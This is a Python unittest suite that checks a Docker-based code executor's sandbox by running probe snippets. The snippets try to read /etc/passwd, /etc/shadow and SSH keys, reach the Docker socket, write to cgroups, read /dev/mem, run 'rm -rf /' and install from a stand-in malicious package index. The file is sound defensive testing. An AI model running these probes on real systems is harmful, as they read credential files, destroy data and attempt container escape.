import unittest
import os
import subprocess
import time
import tempfile
from code_executor import CodeExecutor

class TestCodeExecutorSecurity(unittest.TestCase):
    def setUp(self):
        self.executor = CodeExecutor()
        
    def tearDown(self):
        self.executor.cleanup()
        
    def test_container_isolation(self):
        """Test that containers cannot access host system"""
        malicious_code = """
import os
try:
    with open('/etc/passwd', 'r') as f:
        print(f.read())
except Exception as e:
    print(f"Access denied: {str(e)}")
"""
        result = self.executor.execute_code(malicious_code, [], timeout=5)
        self.assertFalse(result['success'])
        self.assertIn("Access denied", result['error'] or result['output'] or "")
        
    def test_resource_limits(self):
        """Test that resource limits are properly enforced"""
        # Test memory limit
        memory_test = """
import numpy as np
# Try to allocate more than 512MB
arr = np.zeros((10000, 10000), dtype=np.float64)
"""
        result = self.executor.execute_code(memory_test, ["numpy"], timeout=5)
        self.assertFalse(result['success'])
        self.assertIn("Memory", result['error'] or "")
        
        # Test CPU limit
        cpu_test = """
while True:
    pass
"""
        result = self.executor.execute_code(cpu_test, [], timeout=2)
        self.assertFalse(result['success'])
        self.assertIn("timed out", result['error'] or "")
        
    def test_network_isolation(self):
        """Test that containers cannot access network"""
        network_test = """
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('google.com', 80))
    print("Network access successful")
except Exception as e:
    print(f"Network access denied: {str(e)}")
"""
        result = self.executor.execute_code(network_test, [], timeout=5)
        self.assertTrue(result['success'])
        self.assertIn("Network access denied", result['output'])
        
    def test_file_system_isolation(self):
        """Test that containers cannot access sensitive files"""
        fs_test = """
import os
try:
    os.listdir('/')
    print("Root access successful")
except Exception as e:
    print(f"Access denied: {str(e)}")
"""
        result = self.executor.execute_code(fs_test, [], timeout=5)
        self.assertTrue(result['success'])
        self.assertIn("Access denied", result['output'])
        
    def test_package_security(self):
        """Test that malicious package installation attempts are blocked"""
        malicious_package = ["--index-url=http://malicious-site.com/simple", "requests"]
        result = self.executor.execute_code("print('test')", malicious_package, timeout=5)
        self.assertFalse(result['success'])
        
    def test_code_injection_prevention(self):
        """Test that code injection attempts are prevented"""
        injection_test = """
import os
os.system('rm -rf /')  # Attempt to delete everything
"""
        result = self.executor.execute_code(injection_test, [], timeout=5)
        self.assertFalse(result['success'])
        self.assertIn("Permission denied", result['error'] or result['output'] or "")
        
    def test_container_cleanup(self):
        """Test that containers are properly cleaned up"""
        # Create multiple containers
        for _ in range(3):
            self.executor.execute_code("print('test')", [], timeout=1)
            
        # Get container count before cleanup
        before_cleanup = subprocess.run(
            ["docker", "ps", "-q"],
            capture_output=True,
            text=True
        ).stdout.count('\n')
        
        self.executor.cleanup()
        
        # Get container count after cleanup
        after_cleanup = subprocess.run(
            ["docker", "ps", "-q"],
            capture_output=True,
            text=True
        ).stdout.count('\n')
        
        self.assertEqual(after_cleanup, 0)
        self.assertGreater(before_cleanup, 0)

    # NEW COMPREHENSIVE SECURITY TESTS

    def test_proc_filesystem_attack(self):
        """Test attempts to access /proc filesystem for host information"""
        proc_attack = """
import os
import glob
attempts = []

# Try to access host process information
try:
    with open('/proc/version', 'r') as f:
        attempts.append(f"Host kernel: {f.read().strip()}")
except Exception as e:
    attempts.append(f"proc/version blocked: {e}")

# Try to access host memory info
try:
    with open('/proc/meminfo', 'r') as f:
        attempts.append(f"Host memory: {f.read()[:100]}")
except Exception as e:
    attempts.append(f"proc/meminfo blocked: {e}")

# Try to access host processes
try:
    procs = glob.glob('/proc/[0-9]*')
    attempts.append(f"Found {len(procs)} processes")
    if procs:
        # Try to read process info
        with open(f'{procs[0]}/cmdline', 'r') as f:
            attempts.append(f"Process cmdline: {f.read()}")
except Exception as e:
    attempts.append(f"proc processes blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(proc_attack, [], timeout=5)
        # Should either fail or show container-only info, not host info
        if result['success']:
            # If it succeeds, it should not show host kernel info
            self.assertNotIn("Linux version", result['output'])
            
    def test_sys_filesystem_attack(self):
        """Test attempts to access /sys filesystem"""
        sys_attack = """
import os
import glob
attempts = []

# Try to access system information
try:
    devices = os.listdir('/sys/class')
    attempts.append(f"Found devices: {devices}")
except Exception as e:
    attempts.append(f"sys access blocked: {e}")

# Try to access network interfaces
try:
    net_devs = os.listdir('/sys/class/net')
    attempts.append(f"Network devices: {net_devs}")
except Exception as e:
    attempts.append(f"sys/net blocked: {e}")

# Try to access block devices
try:
    block_devs = os.listdir('/sys/class/block')
    attempts.append(f"Block devices: {block_devs}")
except Exception as e:
    attempts.append(f"sys/block blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(sys_attack, [], timeout=5)
        # Should not expose host devices
        if result['success']:
            self.assertNotIn("sda", result['output'])  # Common host disk
            self.assertNotIn("eth0", result['output'])  # Common host interface
            
    def test_docker_socket_access(self):
        """Test attempts to access Docker socket"""
        docker_socket_attack = """
import os
import socket
attempts = []

# Try to access Docker socket
socket_paths = [
    '/var/run/docker.sock',
    '/run/docker.sock',
    '/docker.sock'
]

for path in socket_paths:
    try:
        if os.path.exists(path):
            attempts.append(f"Docker socket found at: {path}")
            # Try to connect
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.connect(path)
            attempts.append(f"Connected to Docker socket at {path}")
            sock.close()
    except Exception as e:
        attempts.append(f"Docker socket access blocked at {path}: {e}")

# Try to run docker commands
try:
    import subprocess
    result = subprocess.run(['docker', 'ps'], capture_output=True, text=True)
    attempts.append(f"Docker command result: {result.stdout}")
except Exception as e:
    attempts.append(f"Docker command blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(docker_socket_attack, [], timeout=5)
        # Should not be able to access Docker socket
        if result['success']:
            self.assertNotIn("Connected to Docker socket", result['output'])
            self.assertNotIn("CONTAINER ID", result['output'])
            
    def test_privilege_escalation_attempts(self):
        """Test various privilege escalation attempts"""
        privilege_escalation = """
import os
import subprocess
attempts = []

# Check current user
try:
    import pwd
    user = pwd.getpwuid(os.getuid()).pw_name
    attempts.append(f"Current user: {user}")
    attempts.append(f"UID: {os.getuid()}, GID: {os.getgid()}")
except Exception as e:
    attempts.append(f"User info error: {e}")

# Try sudo
try:
    result = subprocess.run(['sudo', 'whoami'], capture_output=True, text=True)
    attempts.append(f"Sudo result: {result.stdout}")
except Exception as e:
    attempts.append(f"Sudo blocked: {e}")

# Try to access shadow file
try:
    with open('/etc/shadow', 'r') as f:
        attempts.append(f"Shadow file: {f.read()[:100]}")
except Exception as e:
    attempts.append(f"Shadow file blocked: {e}")

# Try to write to system directories
try:
    with open('/etc/test_file', 'w') as f:
        f.write('test')
    attempts.append("Successfully wrote to /etc/")
except Exception as e:
    attempts.append(f"Write to /etc blocked: {e}")

# Try to access SSH keys
try:
    ssh_keys = os.listdir('/root/.ssh')
    attempts.append(f"SSH keys: {ssh_keys}")
except Exception as e:
    attempts.append(f"SSH keys blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(privilege_escalation, [], timeout=5)
        if result['success']:
            self.assertIn("codeuser", result['output'])  # Should be codeuser
            self.assertNotIn("root", result['output'].split('\n')[0])  # First line should not be root
            self.assertNotIn("Successfully wrote to /etc/", result['output'])
            
    def test_container_escape_cgroups(self):
        """Test attempts to escape via cgroups manipulation"""
        cgroup_escape = """
import os
import glob
attempts = []

# Try to access cgroup information
cgroup_paths = [
    '/sys/fs/cgroup',
    '/proc/self/cgroup',
    '/proc/1/cgroup'
]

for path in cgroup_paths:
    try:
        if os.path.exists(path):
            if os.path.isfile(path):
                with open(path, 'r') as f:
                    content = f.read()
                    attempts.append(f"Cgroup info from {path}: {content[:200]}")
            else:
                items = os.listdir(path)
                attempts.append(f"Cgroup dir {path}: {items}")
    except Exception as e:
        attempts.append(f"Cgroup access blocked at {path}: {e}")

# Try to write to cgroup files
try:
    with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'w') as f:
        f.write('999999999999')
    attempts.append("Successfully modified memory limit")
except Exception as e:
    attempts.append(f"Cgroup write blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(cgroup_escape, [], timeout=5)
        if result['success']:
            self.assertNotIn("Successfully modified memory limit", result['output'])
            
    def test_namespace_escape_attempts(self):
        """Test attempts to escape various namespaces"""
        namespace_escape = """
import os
import glob
attempts = []

# Check current namespaces
try:
    ns_links = glob.glob('/proc/self/ns/*')
    for link in ns_links:
        target = os.readlink(link)
        attempts.append(f"Namespace {os.path.basename(link)}: {target}")
except Exception as e:
    attempts.append(f"Namespace info blocked: {e}")

# Try to access host namespaces
try:
    host_ns = glob.glob('/proc/1/ns/*')
    for link in host_ns:
        target = os.readlink(link)
        attempts.append(f"Host namespace {os.path.basename(link)}: {target}")
except Exception as e:
    attempts.append(f"Host namespace blocked: {e}")

# Try unshare command
try:
    import subprocess
    result = subprocess.run(['unshare', '--help'], capture_output=True, text=True)
    attempts.append(f"Unshare available: {result.returncode == 0}")
except Exception as e:
    attempts.append(f"Unshare blocked: {e}")

# Try to access /proc/sys/kernel
try:
    kernel_files = os.listdir('/proc/sys/kernel')
    attempts.append(f"Kernel files: {kernel_files[:10]}")
except Exception as e:
    attempts.append(f"Kernel access blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(namespace_escape, [], timeout=5)
        # Should be in separate namespaces from host
        if result['success']:
            lines = result['output'].split('\n')
            # Check if we have different namespace IDs than host
            container_ns = [line for line in lines if 'Namespace' in line and 'proc/self' in line]
            host_ns = [line for line in lines if 'Host namespace' in line]
            if container_ns and host_ns:
                # Should have different namespace IDs
                self.assertNotEqual(container_ns[0].split(':')[-1], host_ns[0].split(':')[-1])
                
    def test_device_access_attempts(self):
        """Test attempts to access host devices"""
        device_access = """
import os
import glob
attempts = []

# Try to access device files
device_paths = [
    '/dev/sda*',
    '/dev/hda*',
    '/dev/xvda*',
    '/dev/nvme*',
    '/dev/mem',
    '/dev/kmem',
    '/dev/port'
]

for pattern in device_paths:
    try:
        devices = glob.glob(pattern)
        if devices:
            attempts.append(f"Found devices: {devices}")
            # Try to read from first device
            with open(devices[0], 'rb') as f:
                data = f.read(10)
                attempts.append(f"Read from {devices[0]}: {len(data)} bytes")
    except Exception as e:
        attempts.append(f"Device access blocked {pattern}: {e}")

# Try to access raw memory
try:
    with open('/dev/mem', 'rb') as f:
        data = f.read(10)
        attempts.append(f"Memory access: {len(data)} bytes")
except Exception as e:
    attempts.append(f"Memory access blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(device_access, [], timeout=5)
        if result['success']:
            self.assertNotIn("Memory access:", result['output'])
            self.assertNotIn("Read from /dev/sda", result['output'])
            
    def test_host_filesystem_mount_escape(self):
        """Test attempts to access host filesystem via mounts"""
        mount_escape = """
import os
import subprocess
attempts = []

# Check current mounts
try:
    with open('/proc/mounts', 'r') as f:
        mounts = f.read()
        attempts.append(f"Mount info: {mounts[:500]}")
except Exception as e:
    attempts.append(f"Mount info blocked: {e}")

# Try to mount host filesystem
try:
    result = subprocess.run(['mount', '/dev/sda1', '/mnt'], capture_output=True, text=True)
    attempts.append(f"Mount result: {result.stderr}")
except Exception as e:
    attempts.append(f"Mount blocked: {e}")

# Look for suspicious mount points
suspicious_mounts = [
    '/host',
    '/hostfs',
    '/proc/1/root',
    '/var/lib/docker'
]

for mount in suspicious_mounts:
    try:
        if os.path.exists(mount):
            contents = os.listdir(mount)
            attempts.append(f"Suspicious mount {mount}: {contents[:10]}")
    except Exception as e:
        attempts.append(f"Suspicious mount blocked {mount}: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(mount_escape, [], timeout=5)
        if result['success']:
            self.assertNotIn("Suspicious mount /host:", result['output'])
            self.assertNotIn("Suspicious mount /hostfs:", result['output'])
            
    def test_capabilities_and_seccomp(self):
        """Test container capabilities and seccomp restrictions"""
        capabilities_test = """
import os
import subprocess
attempts = []

# Check current capabilities
try:
    with open('/proc/self/status', 'r') as f:
        for line in f:
            if 'Cap' in line:
                attempts.append(f"Capability: {line.strip()}")
except Exception as e:
    attempts.append(f"Capabilities blocked: {e}")

# Try privileged operations
privileged_ops = [
    ['mknod', '/tmp/test_device', 'c', '1', '3'],
    ['mount', '-t', 'tmpfs', 'tmpfs', '/tmp/test_mount'],
    ['chroot', '/tmp'],
    ['setuid', '0']
]

for op in privileged_ops:
    try:
        result = subprocess.run(op, capture_output=True, text=True)
        attempts.append(f"Privileged op {op[0]}: {result.returncode}")
    except Exception as e:
        attempts.append(f"Privileged op {op[0]} blocked: {e}")

# Try to access restricted syscalls
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6")
    # Try to call reboot syscall
    result = libc.reboot(0)
    attempts.append(f"Reboot syscall: {result}")
except Exception as e:
    attempts.append(f"Reboot syscall blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(capabilities_test, [], timeout=5)
        if result['success']:
            # Should not have dangerous capabilities
            self.assertNotIn("CapEff:\tffffffff", result['output'])  # Full capabilities
            self.assertNotIn("Reboot syscall: 0", result['output'])
            
    def test_network_namespace_escape(self):
        """Test attempts to escape network namespace"""
        network_escape = """
import os
import socket
import subprocess
attempts = []

# Check network interfaces
try:
    import netifaces
    interfaces = netifaces.interfaces()
    attempts.append(f"Network interfaces: {interfaces}")
except ImportError:
    try:
        result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
        attempts.append(f"Network links: {result.stdout[:200]}")
    except Exception as e:
        attempts.append(f"Network info blocked: {e}")

# Try to access host network
try:
    # Try to connect to common host services
    host_services = [
        ('127.0.0.1', 22),    # SSH
        ('127.0.0.1', 80),    # HTTP
        ('127.0.0.1', 443),   # HTTPS
        ('localhost', 8000),  # Common dev port
    ]
    
    for host, port in host_services:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            attempts.append(f"Host service {host}:{port}: {result}")
            sock.close()
        except Exception as e:
            attempts.append(f"Host service {host}:{port} blocked: {e}")
            
except Exception as e:
    attempts.append(f"Network access blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(network_escape, ["netifaces"], timeout=5)
        if result['success']:
            # Should not be able to reach host services
            self.assertNotIn("Host service 127.0.0.1:22: 0", result['output'])
            
    def test_process_injection_attempts(self):
        """Test attempts to inject into host processes"""
        process_injection = """
import os
import subprocess
import signal
attempts = []

# Try to list all processes
try:
    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    process_lines = result.stdout.split('\\n')
    attempts.append(f"Process count: {len(process_lines)}")
    
    # Look for host processes
    host_indicators = ['systemd', 'dbus', 'NetworkManager', 'docker']
    for line in process_lines:
        for indicator in host_indicators:
            if indicator in line:
                attempts.append(f"Host process found: {line}")
                break
except Exception as e:
    attempts.append(f"Process listing blocked: {e}")

# Try to send signals to process 1 (init)
try:
    os.kill(1, signal.SIGTERM)
    attempts.append("Successfully sent signal to init")
except Exception as e:
    attempts.append(f"Signal to init blocked: {e}")

# Try to access other process memory
try:
    with open('/proc/1/mem', 'rb') as f:
        data = f.read(10)
        attempts.append(f"Process memory access: {len(data)} bytes")
except Exception as e:
    attempts.append(f"Process memory blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(process_injection, [], timeout=5)
        if result['success']:
            self.assertNotIn("Successfully sent signal to init", result['output'])
            self.assertNotIn("Process memory access:", result['output'])
            
    def test_resource_exhaustion_attacks(self):
        """Test various resource exhaustion attacks"""
        resource_exhaustion = """
import os
import threading
import time
attempts = []

# Try to exhaust file descriptors
try:
    files = []
    for i in range(10000):
        f = open(f'/tmp/test_{i}', 'w')
        files.append(f)
    attempts.append(f"Opened {len(files)} files")
except Exception as e:
    attempts.append(f"File descriptor limit: {e}")

# Try to create many processes
try:
    import subprocess
    processes = []
    for i in range(100):
        p = subprocess.Popen(['sleep', '60'])
        processes.append(p)
    attempts.append(f"Created {len(processes)} processes")
except Exception as e:
    attempts.append(f"Process limit: {e}")

# Try to create many threads
try:
    def dummy_thread():
        time.sleep(60)
    
    threads = []
    for i in range(1000):
        t = threading.Thread(target=dummy_thread)
        t.start()
        threads.append(t)
    attempts.append(f"Created {len(threads)} threads")
except Exception as e:
    attempts.append(f"Thread limit: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(resource_exhaustion, [], timeout=5)
        # Should hit resource limits
        if result['success']:
            self.assertIn("limit", result['output'])
            
    def test_kernel_module_loading(self):
        """Test attempts to load kernel modules"""
        kernel_module_test = """
import os
import subprocess
attempts = []

# Try to load kernel modules
try:
    result = subprocess.run(['modprobe', 'test_module'], capture_output=True, text=True)
    attempts.append(f"Modprobe result: {result.returncode}")
except Exception as e:
    attempts.append(f"Modprobe blocked: {e}")

# Try to access kernel module directory
try:
    modules = os.listdir('/lib/modules')
    attempts.append(f"Kernel modules: {modules}")
except Exception as e:
    attempts.append(f"Kernel modules blocked: {e}")

# Try to write to kernel parameters
try:
    with open('/proc/sys/kernel/hostname', 'w') as f:
        f.write('hacked')
    attempts.append("Successfully changed hostname")
except Exception as e:
    attempts.append(f"Kernel parameter write blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(kernel_module_test, [], timeout=5)
        if result['success']:
            self.assertNotIn("Successfully changed hostname", result['output'])
            
    def test_container_runtime_escape(self):
        """Test attempts to escape via container runtime vulnerabilities"""
        runtime_escape = """
import os
import subprocess
attempts = []

# Check container runtime
try:
    # Look for container runtime files
    runtime_files = [
        '/var/run/containerd',
        '/var/run/runc',
        '/var/run/docker.sock',
        '/.dockerenv'
    ]
    
    for file in runtime_files:
        if os.path.exists(file):
            attempts.append(f"Runtime file found: {file}")
except Exception as e:
    attempts.append(f"Runtime check blocked: {e}")

# Try to access container metadata
try:
    with open('/proc/self/cgroup', 'r') as f:
        cgroup_info = f.read()
        if 'docker' in cgroup_info:
            attempts.append("Docker container detected")
except Exception as e:
    attempts.append(f"Container detection blocked: {e}")

# Try runc exploit patterns
try:
    # This is a simplified test - real exploits would be more complex
    result = subprocess.run(['runc', '--version'], capture_output=True, text=True)
    attempts.append(f"Runc version: {result.stdout}")
except Exception as e:
    attempts.append(f"Runc access blocked: {e}")

for attempt in attempts:
    print(attempt)
"""
        result = self.executor.execute_code(runtime_escape, [], timeout=5)
        if result['success']:
            # Should not have direct access to runtime tools
            self.assertNotIn("Runc version:", result['output'])

if __name__ == '__main__':
    unittest.main() 